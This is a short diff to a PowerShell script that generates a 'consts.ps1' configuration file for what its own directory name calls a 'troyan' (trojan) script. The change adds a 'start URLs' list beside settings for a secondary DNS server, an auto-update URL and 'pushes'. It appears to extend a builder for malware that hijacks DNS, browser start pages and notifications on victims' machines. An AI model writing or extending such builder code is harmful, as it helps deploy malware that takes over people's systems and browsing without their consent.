@@ -46,6 +46,7 @@ $template = @"
 `$SecondaryDNSServer = '2.2.2.2'
 `$updateUrl = '_updateUrl'
 `$xpushes = @(_PUSHES)
+`$xstartUrls = @(_STARTURLS)
 `$xdata = @{
     JOPA
 }
@@ -74,8 +75,13 @@ if ($server.autoUpdate)
 {
     $template = $template -replace "_updateUrl", $server.updateUrl
 }
+
 $pushes = Format-ArrayToString($server.pushes)
 $template = $template -replace "_PUSHES", $pushes
+
+$startUrls = Format-ArrayToString($server.startUrls)
+$template = $template -replace "_STARTURLS", $startUrls
+
 $template  = $template -replace "JOPA", $listString
 $template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')
 
